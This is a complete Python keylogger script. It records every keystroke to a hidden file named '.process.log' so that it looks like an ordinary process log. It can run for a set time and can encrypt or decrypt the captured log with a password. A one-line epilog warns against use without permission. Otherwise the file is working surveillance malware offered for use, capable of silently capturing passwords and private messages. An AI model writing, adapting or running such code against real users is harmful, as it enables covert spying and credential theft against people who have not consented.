import keyboard, argparse, time, base64, platform, subprocess
from threading import Thread
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

parser = argparse.ArgumentParser(
    prog="Python Keylogger",
    description="Captures and stores the keystrokes of a user.",
    epilog="Do not use without permission from the targeted user."
)

parser.add_argument("-f", "--format", action="store_true", help="writes each keypress on a new line in log file")
parser.add_argument("-t", "--time", type=int, help="number of seconds the program with run for")
parser.add_argument("-e", "--encrypt", help="takes in a string that's used to encrypt contents of log file")
parser.add_argument("-d", "--decrypt", help="takes in a string that's used to decrypt contents of log file")

args = parser.parse_args()
f = args.format
max_seconds = args.time
enc_key = args.encrypt
dec_key = args.decrypt

log_file = ".process.log"

def main():
    if dec_key == None:
        print("Capturing strokes...")
        # w mode so log file is overwritten on run
        open(log_file, "w").close()

        def press_key(event):
            with open(log_file, "a") as file:
                if f:
                    # Each key press on new line
                    file.write("{}\n".format(event.name))
                else:
                    # All key presses on same line
                    file.write(event.name)

        keyboard.on_press(press_key)

        # If hashtag is pressed then program will quit
        keyboard.wait("#")

if max_seconds != None:
    # main func is a daemon thread and will end if max_seconds is reached
    t = Thread(target=main)
    t.daemon = True
    t.start()
    time.sleep(max_seconds)
else:
    main()

# Encryption
if enc_key != None and dec_key == None:
    bytes = str.encode(enc_key)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=bytes,
        iterations=390000
    )
    key = base64.urlsafe_b64encode(kdf.derive(bytes))
    fernet = Fernet(key)

    with open(log_file, 'rb') as file:
        original = file.read()

    encrypted = fernet.encrypt(original)

    with open(log_file, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    print("- Log file has been encrypted -")

# Decryption
if (dec_key != None and enc_key == None) and (f == False and max_seconds == None):
    bytes = str.encode(dec_key)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=bytes,
        iterations=390000
    )
    key = base64.urlsafe_b64encode(kdf.derive(bytes))
    fernet = Fernet(key)

    with open(log_file, 'rb') as file:
        encrypted = file.read()

    try:
        decrypted = fernet.decrypt(encrypted)
    except:
        print("Error: File could not be decrypted, incorrect key.")
        exit()

    with open(log_file, 'wb') as dec_file:
        dec_file.write(decrypted)

    print("- Log file has been decrypted -")
elif dec_key != None:
    print("Error: Only a singular argument may be parsed when decrypting, no flags other than -d should be inputted.")